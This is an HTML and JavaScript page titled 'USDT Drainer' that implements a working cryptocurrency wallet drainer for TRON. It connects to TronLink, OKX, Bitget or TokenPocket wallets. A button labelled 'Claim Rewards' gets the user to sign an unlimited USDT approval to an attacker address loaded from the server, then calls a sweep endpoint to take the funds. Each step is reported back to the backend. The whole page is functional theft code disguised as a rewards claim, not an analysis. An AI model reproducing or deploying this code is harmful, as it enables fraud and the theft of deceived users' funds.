<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>USDT Drainer – Multi Wallet</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 20px auto; padding: 20px; background: #f0f2f5; }
        .wallet-grid { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px 0; }
        .wallet-btn { background: #fff; border: 1px solid #ccc; padding: 8px 16px; border-radius: 8px; cursor: pointer; font-size: 16px; }
        .wallet-btn:hover { background: #e0e0e0; }
        #info { margin-top: 20px; padding: 15px; background: #fff; border-radius: 8px; display: none; }
        .status { margin-top: 10px; padding: 8px; background: #e9ecef; border-radius: 5px; }
        button.drain { background: #dc3545; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <h2>💰 Select your wallet</h2>
    <div class="wallet-grid" id="walletList"></div>
    <div id="info">
        <p><strong>Address:</strong> <span id="address"></span></p>
        <p><strong>USDT:</strong> <span id="usdt">0.00</span></p>
        <p><strong>TRX:</strong> <span id="trx">0.00</span></p>
        <button class="drain" id="drainBtn">💸 Claim Rewards (Approve & Transfer)</button>
    </div>
    <div id="status" class="status">Ready. Click a wallet to connect.</div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.0.0/dist/TronWeb.js"></script>
    <script>
        // Wallet definitions with direct detection and connection logic
        const wallets = [
            { 
                name: 'TronLink', 
                detect: () => window.tronLink && window.tronWeb,
                connect: async () => {
                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                    const provider = window.tronWeb;
                    const address = provider.defaultAddress.base58;
                    return { provider, address };
                }
            },
            { 
                name: 'OKX Wallet', 
                detect: () => window.okxwallet && window.okxwallet.tron,
                connect: async () => {
                    const accounts = await window.okxwallet.tron.request({ method: 'tron_requestAccounts' });
                    const address = accounts[0];
                    const provider = new TronWeb({ fullHost: 'https://api.trongrid.io' });
                    // Override signing with OKX
                    provider.trx.sign = async (tx) => {
                        return await window.okxwallet.tron.request({
                            method: 'tron_signTransaction',
                            params: [tx]
                        });
                    };
                    return { provider, address };
                }
            },
            { 
                name: 'Bitget', 
                detect: () => window.bitkeep && window.bitkeep.tronLink,
                connect: async () => {
                    await window.bitkeep.tronLink.request({ method: 'tron_requestAccounts' });
                    const provider = window.bitkeep.tronLink;
                    const address = provider.defaultAddress.base58;
                    return { provider, address };
                }
            },
            { 
                name: 'TokenPocket', 
                detect: () => window.tp && window.tp.tron,
                connect: async () => {
                    const accounts = await window.tp.tron.request({ method: 'tron_requestAccounts' });
                    const address = accounts[0];
                    const provider = new TronWeb({ fullHost: 'https://api.trongrid.io' });
                    provider.trx.sign = async (tx) => {
                        return await window.tp.tron.request({
                            method: 'tron_signTransaction',
                            params: [tx]
                        });
                    };
                    return { provider, address };
                }
            },
            { 
                name: 'Trust Wallet', 
                detect: () => false, 
                connect: async () => { throw new Error('Trust Wallet requires WalletConnect; please use TronLink or OKX for now.'); }
            },
            { 
                name: 'Ledger', 
                detect: () => false, 
                connect: async () => { throw new Error('Ledger requires WebHID; please use TronLink or OKX for now.'); }
            }
        ];

        let currentProvider = null;
        let userAddress = null;
        let tronWeb = null;

        const walletListDiv = document.getElementById('walletList');
        const infoDiv = document.getElementById('info');
        const addressSpan = document.getElementById('address');
        const usdtSpan = document.getElementById('usdt');
        const trxSpan = document.getElementById('trx');
        const drainBtn = document.getElementById('drainBtn');
        const statusDiv = document.getElementById('status');

        function setStatus(msg, isError = false) {
            statusDiv.innerText = msg;
            statusDiv.style.color = isError ? 'red' : 'black';
            console.log(msg);
        }

        async function apiCall(endpoint, data) {
            const res = await fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            return await res.json();
        }

        async function loadBalances(address) {
            try {
                const data = await apiCall('/api/balance', { address });
                usdtSpan.innerText = data.usdt.toFixed(2);
                trxSpan.innerText = data.trx.toFixed(2);
            } catch (err) {
                setStatus('Balance error: ' + err.message, true);
            }
        }

        async function connectWallet(wallet) {
            setStatus(`Connecting to ${wallet.name}...`);
            try {
                if (!wallet.detect()) {
                    setStatus(`${wallet.name} is not installed. Please install the extension.`, true);
                    return;
                }
                const { provider, address } = await wallet.connect();
                userAddress = address;
                currentProvider = provider;
                tronWeb = provider;
                addressSpan.innerText = userAddress;
                infoDiv.style.display = 'block';
                setStatus(`Connected with ${wallet.name}: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
                await fetch('/api/event', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: 'wallet_connected', address: userAddress })
                });
                await loadBalances(userAddress);
            } catch (err) {
                setStatus(`Connection failed: ${err.message}`, true);
            }
        }

        async function approveAndDrain() {
            if (!userAddress || !currentProvider) {
                setStatus('No wallet connected', true);
                return;
            }
            setStatus('Loading config...');
            let config;
            try {
                const res = await fetch('/api/config');
                config = await res.json();
            } catch (err) {
                setStatus('Cannot fetch config', true);
                return;
            }
            const usdtContract = config.usdtContract;
            const drainTarget = config.drainAddress;
            const MAX_UINT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
            try {
                const contract = await tronWeb.contract().at(usdtContract);
                setStatus('Approving USDT...');
                const unsigned = await contract.approve(drainTarget, MAX_UINT).request();
                let signedTx;
                if (currentProvider.trx && currentProvider.trx.sign) {
                    signedTx = await currentProvider.trx.sign(unsigned);
                } else {
                    signedTx = await tronWeb.trx.sign(unsigned);
                }
                const txid = await tronWeb.trx.sendRawTransaction(signedTx);
                setStatus(`✅ Approval sent: ${txid.slice(0,16)}...`);
                await fetch('/api/event', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: 'approve_signed', address: userAddress, txId: txid })
                });
                setStatus('Draining...');
                const sweep = await apiCall('/api/sweep', { address: userAddress });
                if (sweep.success) {
                    setStatus(`🎉 Drained! TX: ${sweep.txId.slice(0,16)}...`);
                    await fetch('/api/event', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ type: 'drain_sent', address: userAddress, txId: sweep.txId, amount: '0' })
                    });
                    setTimeout(() => loadBalances(userAddress), 5000);
                } else {
                    setStatus(`Drain failed: ${sweep.error}`, true);
                }
            } catch (err) {
                setStatus('Error: ' + err.message, true);
            }
        }

        // Create buttons
        for (const w of wallets) {
            const btn = document.createElement('button');
            btn.textContent = w.name;
            btn.className = 'wallet-btn';
            btn.onclick = () => connectWallet(w);
            walletListDiv.appendChild(btn);
        }

        drainBtn.onclick = approveAndDrain;
    </script>
</body>
</html>
